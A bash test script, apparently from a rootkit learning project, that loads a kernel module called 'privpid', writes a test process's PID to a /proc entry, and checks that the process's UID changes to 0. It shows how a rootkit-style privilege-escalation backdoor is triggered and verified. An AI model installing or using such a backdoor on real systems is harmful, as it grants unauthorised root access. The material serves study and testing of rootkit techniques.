#!/bin/bash
set -e

MODULE="privpid"
KO="src/${MODULE}.ko"
PROC="/proc/rootkitlings_privpid"

if [ ! -f "$KO" ]; then
    echo "FAIL: $KO not found. Run make first."
    exit 1
fi

echo "==> Loading $MODULE"
insmod "$KO"

echo "==> Verifying /proc entry exists"
if [ ! -f "$PROC" ]; then
    echo "FAIL: $PROC not found"
    rmmod "$MODULE"
    exit 1
fi

echo "==> Creating test user and starting a shell"
useradd -M testuser 2>/dev/null || true

# Start a sleep process as testuser
su testuser -s /bin/bash -c "sleep 9999 &" &
sleep 1

# Find the sleep process
TARGET_PID=$(pgrep -u testuser "sleep 9999" | head -1)
if [ -z "$TARGET_PID" ]; then
    echo "FAIL: could not find target process"
    rmmod "$MODULE"
    exit 1
fi

echo "    Target PID: $TARGET_PID"
echo "    Before: $(cat /proc/$TARGET_PID/status | grep -E '^Uid:')"

echo "==> Writing PID to /proc entry"
echo "$TARGET_PID" > "$PROC"

echo "    After: $(cat /proc/$TARGET_PID/status | grep -E '^Uid:')"

# Check if uid changed to 0
AFTER_UID=$(cat /proc/$TARGET_PID/status | grep "^Uid:" | awk '{print $2}')
if [ "$AFTER_UID" = "0" ]; then
    echo "PASS: process escalated to root"
else
    echo "FAIL: process uid is $AFTER_UID (expected 0)"
fi

echo "==> Unloading"
rmmod "$MODULE"

echo "==> Cleanup"
kill $TARGET_PID 2>/dev/null || true
userdel testuser 2>/dev/null || true

echo "==> dmesg tail:"
dmesg | tail -5
